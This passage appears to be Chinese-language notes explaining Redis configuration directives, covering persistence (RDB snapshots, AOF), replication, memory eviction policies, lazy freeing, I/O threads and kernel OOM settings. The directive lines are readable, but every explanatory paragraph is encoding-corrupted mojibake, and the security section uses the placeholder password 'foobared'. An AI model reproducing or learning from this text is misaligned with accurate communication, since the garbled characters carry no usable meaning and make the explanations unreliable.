/etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\næ¹å®åæ§è¡ sysctl -p è®©ä¿®æ¹ç«å³çæã\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\nå®¢æ·ç«¯é²ç½® n ç§åå³é­è¿æ¥ï¼0 ç¦ç¨ï¼\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\nåå®¢æ·ç«¯åé tcp ack æ£æµè¿æ¥æ¯å¦æ­å¼ï¼ä¿è¯è¿æ¥æ´»è·ãåä½ç§ï¼é»è®¤ 300 ç§åéä¸æ¬¡ï¼å¦æç­äº 0 å°±æ¯ç¦ç¨ã\n\n\n# general ä¸è¬\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\né»è®¤æåµä¸ï¼redis ä¸ä¼ä½ä¸ºå®æ¤ç¨åºè¿è¡ãå¦æéè¦ï¼è¯·è®¾ç½®ä¸º yesãè¯·æ³¨æï¼redis å®æ¤è¿ç¨å°å¨ /var/run/redis.pid ä¸­åå¥ä¸ä¸ª pid æä»¶ã\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\nå¦æéè¦å¨æºå¨å¯å¨ï¼upstart æ¨¡å¼ æ systemd æ¨¡å¼ï¼æ¶å°±å¯å¨ redis æå¡å¨ï¼å¯ä»¥éè¿è¯¥éé¡¹æ¥éç½® redisã\n\n * supervised no - ä¸ä¼ä¸ supervised tree è¿è¡äº¤äº\n * supervised upstart - å° redis æå¡å¨æ·»å å° sigstop æ¨¡å¼ä¸­\n * supervised systemd - å° ready=1 åå¥ $notify_socket\n * supervised auto - æ ¹æ®ç¯å¢åé upstart_job æ notify_socket æ£æµ upstart è¿æ¯ systemd\n\nä¸è¿° supervision æ¹æ³ï¼upstart æ systemdï¼ä»ååº âç¨åºå·²å°±ç»ªâ ä¿¡å·ï¼ä¸ä¼ç»§ç»­ç» supervisor è¿å ping åå¤ã\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\nå½ redis æå¡å¨å·²å®æ¤è¿ç¨å¯å¨æ¶ï¼å¦ææå®äºéç½®æä»¶ï¼åç´æ¥ä½¿ç¨ï¼å¦ææ²¡ææå®ï¼ååå»º /var/run/redis.pid ä½ä¸ºéç½®æä»¶ã\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\næå®æå¡å¨ç verbosity çº§å«ãredis æä¾åç§çº§å«ï¼\n\n * debug åå«å¤§éä¿¡æ¯ï¼ç¨äºå¼ååæµè¯\n * verbose åå«ä¸äºç¨æçæç¨ä¿¡æ¯ï¼ä½æ²¡æ debug çº§å«æ··ä¹±\n * notice ééæç¤ºä¿¡æ¯ï¼ç¨äºçäº§ç¯å¢\n * warning åªåå«éå¸¸éè¦åå³é®çä¿¡æ¯\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\næå®æ¥å¿æä»¶åç§°ãæå®ä¸ºç©ºæ¶å°è¾åºå°æ åè¾åºè®¾å¤ä¸­ãå¦æ redis ä»¥å®æ¤è¿ç¨å¯å¨ï¼å½æ¥å¿æä»¶åç§°ä¸ºç©ºæ¶ï¼æ¥å¿å°ä¼è¾åºå° /dev/nullã\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\nè®¾ç½®æ°æ®åºçæ°éãé»è®¤ä½¿ç¨ 0 å·æ°æ®åºãå¯ä»¥å¨æ¯ä¸ä¸ªè¿æ¥ä¸ä½¿ç¨ select <dbid> æ¥æå®å¦å¤çæ°æ®åºï¼ä½æ¯è¿ä¸ªå¼å¿é¡»å¨ 0 å° database -1 ä¹é´ã\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis å¯å¨çæ¶åæ¾ç¤º æ¥å¿ã\n\n\n# snapshotting å¿«ç§\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\nè¿äº 900 ç§å¹¶ä¸æ 1 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 300 ç§å¹¶ä¸æ 10 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 60 ç§å¹¶ä¸è³å°æ 10000 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\né»è®¤å¼ä¸º yesãå½å¯ç¨äº rdb ä¸æåä¸æ¬¡åå°ä¿å­æ°æ®å¤±è´¥ï¼redis æ¯å¦åæ­¢æ¥æ¶æ°æ®ãè¿ä¼è®©ç¨æ·æè¯å°æ°æ®æ²¡ææ­£ç¡®æä¹åå°ç£çä¸ï¼å¦åæ²¡æäººä¼æ³¨æå°ç¾é¾ï¼disasterï¼åçäºãå¦æ redis éå¯äºï¼é£ä¹åå¯ä»¥éæ°å¼å§æ¥æ¶æ°æ®äº\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\né»è®¤å¼æ¯ yesãå¯¹äºå­å¨å°ç£çä¸­çå¿«ç§ï¼å¯ä»¥è®¾ç½®æ¯å¦è¿è¡åç¼©å­å¨ãå¦ææ¯çè¯ï¼redis ä¼éç¨ lzf ç®æ³è¿è¡åç¼©ãå¦æä½ ä¸æ³æ¶è cpu æ¥è¿è¡åç¼©çè¯ï¼å¯ä»¥è®¾ç½®ä¸ºå³é­æ­¤åè½ï¼ä½æ¯å­å¨å¨ç£çä¸çå¿«ç§ä¼æ¯è¾å¤§ã\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\nå¨å­å¨å¿«ç§åï¼æä»¬è¿å¯ä»¥è®© redis ä½¿ç¨ crc64 ç®æ³æ¥è¿è¡æ°æ®æ ¡éªï¼ä½æ¯è¿æ ·åä¼å¢å å¤§çº¦ 10% çæ§è½æ¶èï¼å¦æå¸æè·åå°æå¤§çæ§è½æåï¼å¯ä»¥å³é­æ­¤åè½ã\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb æä»¶å¾æä»¶åç§°\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb æä»¶æ¯å¦å é¤åæ­¥é\n\ndir ./\n\n\n1\n\n\nè®¾ç½® rdb æä»¶å­æ¾å¾è·¯å¾\n\n\n# åå»º rdb æä»¶æºå¶\n\nfork åºä¸ä¸ªå­è¿ç¨æ¥å¤çï¼å®åç¶è¿ç¨å±äº«åå­éé¢çä»£ç æ®µåæ°æ®æ®µãè¿æ¶ä½ å¯ä»¥æç¶å­è¿ç¨æ³è±¡æä¸ä¸ªè¿ä½å©´å¿ï¼ä»ä»¬å¨å±äº«èº«ä½ãè¿å°±æ¯ linux æä½ç³»ç»çæºå¶ï¼ä¸ºäºèçº¦åå­èµæºï¼æä»¥å°½å¯è½è®©ä»ä»¬å±äº«èµ·æ¥ãå¨è¿ç¨åç¦»çä¸ç¬é´ï¼åå­çå¢é¿å ä¹æ²¡æææ¾ååã\n\nå­è¿ç¨åæ°æ®æä¹åï¼ä¸ä¼ä¿®æ¹ç°æçåå­æ°æ®ç»æï¼å®åªæ¯å¯¹æ°æ®ç»æè¿è¡éåè¯»åï¼ç¶ååºååå°ç£çä¸­ãä½æ¯ç¶è¿ç¨ä¸ä¸æ ·ï¼å®å¿é¡»æç»­æå¡å®¢æ·è¯·æ±ï¼ç¶åå åå­æ°æ®ç»æè¿è¡ä¸é´æ­çä¿®æ¹ã\n\nè¿ä¸ªæ¶åå°±ä¼ä½¿ç¨æä½ç³»ç»ç cow (copy on write) æºå¶æ¥è¿è¡æ°æ®æ®µé¡µé¢çåç¦»ãæ°æ®æ®µæ¯ç±å¾å¤æä½ç³»ç»çé¡µé¢ç»åèæï¼å½ç¶è¿ç¨å¯¹å¶ä¸­ä¸ä¸ªé¡µé¢çæ°æ®è¿è¡ä¿®æ¹æ¶ï¼ä¼å°è¢«å±äº«çé¡µé¢å¤å¶ä¸ä»½åç¦»åºæ¥ï¼ç¶åå¯¹è¿ä¸ªå¤å¶çé¡µé¢è¿è¡ä¿®æ¹ãè¿æ¶å­è¿ç¨ç¸åºçé¡µé¢æ¯æ²¡æååçï¼è¿æ¯è¿ç¨äº§çé£ä¸ç¬é´çæ°æ®ã\n\néçç¶è¿ç¨ä¿®æ¹æä½çæç»­è¿è¡ï¼è¶æ¥è¶å¤çå±äº«é¡µé¢è¢«åç¦»åºæ¥ï¼åå­å°±ä¼æç»­å¢é¿ï¼ä½æ¯ä¹ä¸ä¼è¶è¿åææ°æ®åå­ç 2 åå¤§å°ãå¦å¤ï¼redis å®ä¾éå·æ°æ®å çæ¯ä¾å¾å¾æ¯æ¯è¾é«çï¼æä»¥å¾å°ä¼åºç°ææçé¡µé¢é½è¢«åç¦»çæåµï¼è¢«åç¦»çå¾å¾åªæå¶ä¸­ä¸é¨åé¡µé¢ãæ¯ä¸ªé¡µé¢çå¤§å°åªæ 4kbï¼ä¸ä¸ª redis å®ä¾éé¢ä¸è¬é½ä¼ææåä¸ä¸ä¸ªé¡µé¢ã\n\nå­è¿ç¨å ä¸ºæ°æ®æ²¡æååï¼å®è½çå°åå­éçæ°æ®å¨è¿ç¨äº§ççä¸ç¬é´å°±ååºäºï¼åä¹ä¸ä¼æ¹åï¼è¿ä¹æ¶ä¸ºä»ä¹ redis çæä¹åå« å¿«ç§ çåå ãæ¥ä¸æ¥å­è¿ç¨å°±å¯ä»¥éå¸¸å®å¿å°ä¾¿å©æ°æ®ï¼è¿è¡åºååç£çäºã\n\n\n# replication ä¸»ä»å¤å¶\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\nå½ä¸ä¸ª slave ä¸ master å¤±å»èç³»æ¶ï¼æèå¤å¶æ­£å¨è¿è¡çæ¶åï¼slave åºå¯¹è¯·æ±çè¡ä¸º:\n\n * å¦æä¸º yesï¼é»è®¤å¼ï¼ï¼slave ä»ç¶ä¼åºç­å®¢æ·ç«¯è¯·æ±ï¼ä½è¿åçæ°æ®å¯è½æ¯è¿æ¶ï¼æèæ°æ®å¯è½æ¯ç©ºçå¨ç¬¬ä¸æ¬¡åæ­¥çæ¶å\n * å¦æä¸º no ï¼å¨ä½ æ§è¡é¤äº info å salveof ä¹å¤çå¶ä»å½ä»¤æ¶ï¼slave é½å°è¿åä¸ä¸ª "sync with master in progress" çéè¯¯ã\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\nè®¾ç½® slave æ¯å¦æ¯åªè¯»çãä» 2.6 çèµ·ï¼slave é»è®¤æ¯åªè¯»ç\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\nä¸»ä»æ°æ®å¤å¶æ¯å¦ä½¿ç¨æ ç¡¬çå¤å¶åè½ã\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\næ ç£ç (diskless) æ¹å¼å¨è¿è¡æ°æ®ä¼ éä¹åä¼æä¸ä¸ªæ¶é´çå»¶è¿ï¼ä»¥ä¾¿ slave ç«¯è½å¤è¿è¡å°å¾ä¼ éçç®æ éåä¸­ï¼è¿ä¸ªæ¶é´é»è®¤æ¯ 5 ç§\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\næ¯å¦å¯ç¨ tcp_nodelayï¼å¦æå¯ç¨åä¼ä½¿ç¨å°éç tcp ååå¸¦å®½å»è¿è¡æ°æ®ä¼ è¾å° slave ç«¯ï¼å½ç¶éåº¦ä¼æ¯è¾æ¢ï¼å¦æä¸å¯ç¨åä¼ è¾éåº¦æ¯è¾å¿«ï¼ä½æ¯ä¼å ç¨æ¯è¾å¤çå¸¦å®½ã\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\nå½ master ä¸è½æ­£å¸¸å·¥ä½çæ¶åï¼redis sentinel ä¼ä» slaves ä¸­éåºä¸ä¸ªæ°ç masterï¼è¿ä¸ªå¼è¶å°ï¼å°±è¶ä¼è¢«ä¼åéä¸­ï¼ä½æ¯å¦ææ¯ 0 ï¼ é£æ¯æå³çè¿ä¸ª slave ä¸å¯è½è¢«éä¸­ã é»è®¤ä¼åçº§ä¸º 100ã\n\n\n# - keys tracking é®è¿½è¸ª\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security å®å¨\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command config ""\n\n\n1\n\n\n\n# clients å®¢æ·\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\nè®¾ç½®æå¤§è¿æ¥å®¢æ·ç«¯æ°ãé»è®¤æåµä¸ï¼æ­¤éå¶è®¾ç½®ä¸º 10000 ä¸ªå®¢æ·ç«¯ï¼ä½æ¯ï¼å¦æ redis æå¡å¨æ æ³å°è¿ç¨æä»¶éå¶éç½®ä¸ºåè®¸æå®çéå¶ï¼ååè®¸çæå¤§å®¢æ·ç«¯æ°å°è®¾ç½®ä¸ºå½åæä»¶éå¶åå» 32ï¼å ä¸º redis ä¿çäºåé¨ä½¿ç¨çæä»¶æè¿°ç¬¦å¾å°ï¼\n\nè¾¾å°éå¶åï¼redis å°å³é­æææ°è¿æ¥ï¼å¹¶åééè¯¯æ¶æ¯ âå·²è¾¾å°æå¤§å®¢æ·ç«¯æ°ã\n\nå½ä½¿ç¨ redis cluster æ¶ï¼æå¤§è¿æ¥æ°ä¹ä¼ä¸éç¾¤æ»çº¿å±äº«ï¼éç¾¤ä¸­çæ¯ä¸ªèç¹å°ä½¿ç¨ä¸¤ä¸ªè¿æ¥ï¼ä¸ä¸ªè¿å¥ï¼å¦ä¸ä¸ªåå¤ãå¯¹äºéå¸¸å¤§çéç¾¤ï¼éè¦çæ¯ç¸åºå°è°æ´éå¶å¤§å°ã\n\n\n# memory management åå­ç®¡ç\n\n\n# maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\nå°åå­ä½¿ç¨éå¶è®¾ç½®ä¸ºæå®çå­èæ°ãå½è¾¾å°åå­éå¶æ¶ï¼redis å°å°è¯æ ¹æ®æéçç­ç¥æ¥å é¤ keyï¼è¯·åè§ maxmemory-policyï¼ã\n\nå¦æ redis æ æ³æ ¹æ®è¯¥ç­ç¥å é¤ keyï¼æèå¦æè¯¥ç­ç¥è®¾ç½®ä¸º \'noeviction\'ï¼å redis å°å¼å§å¯¹å°ä½¿ç¨æ´å¤åå­çå½ä»¤ï¼ä¾å¦ setï¼lpush ç­ï¼è¿è¡éè¯¯ç­å¤ï¼å¹¶å°ç»§ç»­ç­å¤è¯¸å¦ get ä¹ç±»çåªè¯»å½ä»¤ã(ä¸æ¯æåï¼åªæ¯æè¯»)\n\nå¦ææ¯ä¸»ä»å¤å¶ï¼å»ºè®®æ¨ä¸º maxmemory è®¾ç½®ä¸ä¸ªä¸éï¼ä»¥ä¾¿ç³»ç»ä¸æä¸äºå¯ç¨åå­ç¨äº âä»â è¾åºç¼å²åºï¼ä½æ¯å¦æç­ç¥ä¸º \'noeviction\'ï¼åä¸éè¦è¿æ ·åï¼ã\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory ç­ç¥ï¼è¾¾å° maxmemory æ¶ï¼redis å°å¦ä½éæ©è¦å é¤çåå®¹ãæ¨å¯ä»¥ä»ä»¥ä¸è¡ä¸ºä¸­éæ©ä¸ç§ï¼\n\n * volatile-lruï¼å©ç¨ lru ç®æ³ç§»é¤è¿æ keysã\n * allkeys-lruï¼å©ç¨ lru ç®æ³ç§»é¤ keysã\n * volatile-randomï¼éæºç§»é¤è¿æ keysã\n * allkeys-randomï¼éæºç§»é¤ keysã\n * volatile-ttlï¼æç§æè¿è¿ææ¶é´æ¥å é¤ï¼è¾ä»¥ ttlï¼ï¼ç§»é¤å³å°è¿æç keysã\n * noevictionï¼ä¸ç§»é¤ä»»ä½ keyï¼åªæ¯è¿åä¸ä¸ªåéè¯¯ã\n\n\n# maxmemory-samples\n\nmaxmemory-samples 5\n\n\n1\n\n\nredis ä¸­ç lru ä¸æ¯ä¸¥æ ¼æä¹ä¸ç lru ç®æ³å®ç°ï¼æ¯ä¸ç§è¿ä¼¼ç lru å®ç°ï¼ä¸»è¦æ¯ä¸ºäºèçº¦åå­å ç¨ä»¥åæåæ§è½ã\n\nredis ç lru æ¯ååº éç½®çæ°ç®ç key (5)ï¼ç¶åä»ä¸­éæ©ä¸ä¸ªæè¿æä¸ç»å¸¸ä½¿ç¨ç key è¿è¡ç½®æ¢ã\n\nå¯¹ lru æ¥è¯´ 5 æ¯æ¯è¾åéçã10 å·²ç»å¾æ¥è¿äºçæ­£ç lruï¼ä½ä¼æ¶èæ´å¤ç cpuã3 ä¼æ´å¿«ä½æ²¡æé£ä¹ç²¾ç¡®ã\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\nä» redis 5 å¼å§ï¼é»è®¤æåµä¸ï¼replica èç¹ä¼å¿½ç¥ maxmemory è®¾ç½®ï¼é¤éå¨åç failover åï¼æ­¤èç¹è¢«æåä¸º master èç¹ï¼ã è¿æå³çåªæ master æä¼æ§è¡è¿æå é¤ç­ç¥ï¼å¹¶ä¸ master å¨å é¤é®ä¹åä¼å¯¹ replica åé del å½ä»¤ã\n\nè¿ä¸ªè¡ä¸ºä¿è¯äº master å replicas çä¸è´æ§ï¼å¹¶ä¸è¿éå¸¸ä¹æ¯ä½ éè¦çï¼ä½æ¯è¥ä½ ç replica èç¹æ¯å¯åçï¼ æèä½ å¸æ replica èç¹æä¸åçåå­éç½®ï¼å¹¶ä¸ä½ ç¡®ä¿ææå° replica åæä½é½å¹ç­çï¼é£ä¹ä½ å¯ä»¥ä¿®æ¹è¿ä¸ªé»è®¤çè¡ä¸º ï¼è¯·ç¡®ä¿ä½ æç½ä½ å¨åä»ä¹ï¼ã\n\néè¦æ³¨æçæ¯é»è®¤æåµä¸ replica èç¹ä¸ä¼æ§è¡è¿æç­ç¥ï¼å®æå¯è½ä½¿ç¨äºè¶è¿ maxmemory è®¾å®çå¼çåå­ã å æ­¤ä½ éè¦çæ§ replicas èç¹æå¨çæºå¨å¹¶ä¸ç¡®ä¿å¨ master èç¹å°è¾¾éç½®ç maxmemory å¤§å°æ¶ï¼ replicas èç¹ä¸ä¼è¶è¿ç©çåå­çå¤§å°ã\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing ææ°éæ¾\n\nlazy free åºç¨äºè¢«å¨å é¤ä¸­ï¼ç®åæ 4 ç§åºæ¯ï¼æ¯ç§åºæ¯å¯¹åºä¸ä¸ªéç½®åæ°ï¼ é»è®¤é½æ¯å³é­ã\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\néå¯¹ redis åå­ä½¿ç¨è¾¾å° maxmeoryï¼å¹¶è®¾ç½®ææ·æ±°ç­ç¥æ¶ï¼å¨è¢«å¨æ·æ±°é®æ¶ï¼æ¯å¦éç¨ lazy free æºå¶ï¼\n\nå ä¸ºæ­¤åºæ¯å¼å¯ lazy free, å¯è½ä½¿ç¨æ·æ±°é®çåå­éæ¾ä¸åæ¶ï¼å¯¼è´ redis åå­è¶ç¨ï¼è¶è¿ maxmemory çéå¶ãæ­¤åºæ¯ä½¿ç¨æ¶ï¼è¯·ç»åä¸å¡æµè¯ã\n\n\n# lazyfree-lazy-expire\n\néå¯¹è®¾ç½®æ ttl çé®ï¼è¾¾å°è¿æåï¼è¢« redis æ¸çå é¤æ¶æ¯å¦éç¨ lazy free æºå¶ï¼\n\næ­¤åºæ¯å»ºè®®å¼å¯ï¼å  ttl æ¬èº«æ¯èªéåºè°æ´çéåº¦ã\n\n\n# lazyfree-lazy-server-del\n\néå¯¹æäºæä»¤å¨å¤çå·²å­å¨çé®æ¶ï¼ä¼å¸¦æä¸ä¸ªéå¼ç del é®çæä½ãrename å½ä»¤å½ç®æ é®å·²å­å¨ï¼redis ä¼åå é¤ç®æ é®ï¼å¦æè¿äºç®æ é®æ¯ä¸ä¸ª big key, é£å°±ä¼å¼å¥é»å¡å é¤çæ§è½é®é¢ã æ­¤åæ°è®¾ç½®å°±æ¯è§£å³è¿ç±»é®é¢ï¼å»ºè®®å¯å¼å¯ã\n\n\n# slave-lazy-flush\n\néå¯¹ slave è¿è¡å¨éæ°æ®åæ­¥ï¼slave å¨å è½½ master ç rdb æä»¶åï¼ä¼è¿è¡ flushall æ¥æ¸çèªå·±çæ°æ®åºæ¯ï¼åæ°è®¾ç½®å³å®æ¯å¦éç¨å¼å¸¸ flush æºå¶ãå¦æåå­åå¨ä¸å¤§ï¼å»ºè®®å¯å¼å¯ãå¯åå°å¨éåæ­¥èæ¶ï¼ä»èåå°ä¸»åºå è¾åºç¼å²åºçæ¶¨å¼èµ·çåå­ä½¿ç¨å¢é¿ã\n\n\n# lazyfree-lazy-user-del\n\nå¯¹äºä¸å®¹æç¨ unlink è°ç¨æ¿æ¢ç¨æ·ä»£ç  del è°ç¨çæåµï¼ä¹å¯ä»¥ä½¿ç¨ lazyfree-lazy-user-del yes éç½®æä»¤å° del å½ä»¤çé»è®¤è¡ä¸ºä¿®æ¹ä¸ºä¸ unlink å®å¨ç¸åã\n\n\n# threaded i/o çº¿ç¨\n\né»è®¤æåµä¸ï¼çº¿ç¨æ¯ç¦ç¨çï¼æä»¬å»ºè®®ä»å¨å·æè³å° 4 ä¸ªææ´å¤åæ ¸çè®¡ç®æºä¸å¯ç¨å®ï¼èè³å°ä¿çä¸ä¸ªå¤ç¨åæ ¸ãä½¿ç¨ 8 ä¸ªä»¥ä¸ççº¿ç¨ä¸å¤ªå¯è½æå¾å¤§å¸®å©ãæä»¬è¿å»ºè®®å¨ç¡®å®å­å¨æ§è½é®é¢æ¶åä½¿ç¨çº¿ç¨ i / oï¼redis å®ä¾ä¼ä½¿ç¨å¾å¤§ä¸é¨å cpu æ¶é´ï¼å¦åå°±æ²¡æå¿è¦ä½¿ç¨æ­¤åè½ã\n\nio-threads 4\n\n\n1\n\n\nå æ­¤ï¼å¦ææ¨æåä¸ªæ ¸çï¼è¯·å°è¯ä½¿ç¨ 2 æ 3 ä¸ª i / o çº¿ç¨ï¼å¦ææ¨æ 8 ä¸ªæ ¸ï¼è¯·å°è¯ä½¿ç¨ 6 ä¸ªçº¿ç¨ã\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\néå¸¸ï¼å° io-threads è®¾ç½®ä¸º 1 åªä¼ä½¿ç¨ä¸»çº¿ç¨ãå¯ç¨ i / o çº¿ç¨åï¼æä»¬ä»å°çº¿ç¨ç¨äºåæä½ï¼å³å¯¹ write ç³»ç»è°ç¨è¿è¡çº¿ç¨åï¼å¹¶å°å®¢æ·ç«¯ç¼å²åºä¼ è¾å°å¥æ¥å­ãä½æ¯ï¼ä¹å¯ä»¥éè¿ io-threads-do-reads yes æ¥å¯ç¨è¯»åçº¿ç¨ååè®®è§£æãéå¸¸ï¼çº¿ç¨è¯»åæ²¡æå¤ªå¤§å¸®å©ã\n\næ æ³å¨è¿è¡æ¶éè¿ config set æ´æ¹æ­¤éç½®æä»¤ãå¯ç¨ s sl æ¶ï¼aso æ­¤åè½å½åä¸èµ·ä½ç¨ã\n\n\n# kernel oom control åæ ¸ oom æ§å¶\n\nè¿ä¸ª oom-score-adj åæ°æ¯ç¨æ¥ linux åæ ¸æ§å¶è°ä¼çï¼å¨ linux ç³»ç»ä¸­ï¼å½åå­æº¢åºæ¶ï¼å¯ä»¥æç¤ºåæ ¸ oom killer åºè¯¥é¦åææ­»åªäºè¿ç¨ã\n\noom-score-adj no\n\n\n1\n\n\nå¯ç¨æ­¤åè½å¯ä½¿ redis æ ¹æ®å¶è¿ç¨ä¸»å¨æ§å¶å¶ææè¿ç¨ç oom_score_adj å¼ãé»è®¤åæ°å°å°è¯ä½¿åå°å­è¿ç¨å¨ææå¶ä»è¿ç¨ä¹åè¢«ææ­»ï¼è replicas å¨ä¸»æ°æ®åºä¹åè¢«ææ­»ã\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\né»è®¤ oom-score-adj-values ä¸è®¾ç½®çæåµä¸ä¼ä¼åææ­»åå°å­è¿ç¨ï¼ç¶åä¸»ä»èç¹ä¼åä¼åææ­»ä»èç¹ã\n\næä»¥è¿ 3 ä¸ªå¼åå«ç¨æ¥è®¾ç½®ä¸»ãä»ãåå°å­è¿ç¨çåå¼çï¼åå¼èå´ä» -1000 ~ 1000ï¼åå¼è¶é«è¶æå¯è½è¢«åææ­»ã\n\n\n# append only mode aof è¿½å æ¨¡å¼\n\nredis å¯ä»¥å®ç°æ°æ®çæä¹åå­å¨ï¼å³å°æ°æ®ä¿å­å°ç£çä¸ã\nredis çæä¹åå­å¨æä¾ä¸¤ç§æ¹å¼ï¼rdb ä¸ aofãrdb æ¯é»è®¤éç½®ãaof éè¦æå¨å¼å¯ã\nç°å¨ redis çéç½®ä¸­é»è®¤æ¯å³é­ aof æ¨¡å¼çã\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\næ¯å¦å¼å¯ aof\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\nä¿å­æ°æ®ç aof æä»¶åç§°\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nredis æ¯æ 3 ç§ä¸åçæ¨¡å¼ï¼\n\n * noï¼ä¸å³æ¶åæ­¥ï¼ç±æä½ç³»ç»æ§å¶ä½æ¶å·åå°ç£çä¸ï¼è¿ç§æ¨¡å¼éåº¦æå¿«ï¼\n * alwaysï¼æ¯æ¬¡åªåæ¥å¿ï¼éåº¦è¾æ¢ï¼ä½æå®å¨ï¼\n * everysecï¼æ¯ç§éåæ­¥ä¸æ¬¡ï¼æä¸­çæ¹æ¡ã\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\nå½ä½¿ç¨ aof ç appendfsync è®¾ç½®ä¸º always æ everysec æ¶ï¼åå°çå­å¨è¿ç¨ä¼æ§è¡å¤§éçç£ç i/o æä½ï¼å¨ä¸äº linux æ¶æä¸­ï¼redis fsync () è°ç¨æ¶å¯è½ä¼é»å¡å¾ä¹ãè¿ä¸ªé®é¢å½åå¹¶æ²¡æä¿®å¤ï¼å³ä½¿æ¯å¨ä¸ä¸ªä¸åççº¿ç¨æ§è¡ fsync ä¹ä¼é»å¡æä»¬çåæ­¥åè°ç¨ã\n\nä¸ºäºç¼è§£è¿ä¸ªé®é¢ï¼å¯ä»¥ä½¿ç¨ä»¥ä¸éé¡¹ï¼å®å°ä¼å¨æä¸ä¸ª bgsave æ bgrewriteaof æ­£å¨è¿è¡æ¶ï¼é»æ­¢ä¸»è¿ç¨è°ç¨ fsync ()ã\n\nè¿æå³çæå¦ä¸ä¸ªå­è¿ç¨å¨å­å¨æ¶ï¼redis çæä¹æ§ç­åäº appendfsync noãå¨å®è·µä¸­ï¼æå³çå¨æåçæåµä¸å®å¯è½ä¸¢å¤±å¤è¾¾ 30 ç§çæ¥å¿ï¼é»è®¤ç linux è®¾ç½®ï¼ã\n\nå¦æä½ ææ½å¨çé®é¢éè¦æ´æ¹å®ä¸º âyesâãå¦åä»æä¹æ§çè§ç¹æ¥ç ânoâ æ¯æå®å¨çéæ©ã\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof æä»¶å¢é¿æ¯ä¾ï¼æå½å aof æä»¶æ¯ä¸æ¬¡éåçå¢é¿æ¯ä¾å¤§å°ãaof éåå³å¨ aof æä»¶å¨ä¸å®å¤§å°ä¹åï¼éæ°å°æ´ä¸ªåå­åå° aof æä»¶å½ä¸­ï¼ä»¥åæ ææ°çç¶æ (ç¸å½äº bgsave)ãè¿æ ·å°±é¿åäºï¼aof æä»¶è¿å¤§èå®éåå­æ°æ®å°çé®é¢ (é¢ç¹ä¿®æ¹æ°æ®é®é¢).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof æä»¶éåæå°çæä»¶å¤§å°ï¼å³æå¼å§ aof æä»¶å¿é¡»è¦è¾¾å°è¿ä¸ªæä»¶æ¶æè§¦åï¼åé¢çæ¯æ¬¡éåå°±ä¸ä¼æ ¹æ®è¿ä¸ªåéäº (æ ¹æ®ä¸ä¸æ¬¡éåå®æä¹åçå¤§å°). æ­¤åéä»åå§åå¯å¨ redis ææãå¦ææ¯ redis æ¢å¤æ¶ï¼å lastsize ç­äºåå§ aof æä»¶å¤§å°ã\n\n# rewrite æºå¶\n\nå¶å® redis oaf æºå¶åæ¬äºä¸¤ä»¶äºï¼rewrite å aofãrewrite ç±»ä¼¼äºæ®éæ°æ®åºç®¡çç³»ç»æ¥å¿æ¢å¤ç¹ï¼å½ aof æä»¶éçåå½ä»¤çè¿è¡è¨èæ¶ï¼å½æä»¶å¤§å°è§¦ç¢°å°ä¸´çæ¶ï¼rewrite ä¼è¢«è¿è¡ã\n\nrewrite ä¼åå¤å¶ä¸æ ·ï¼fork 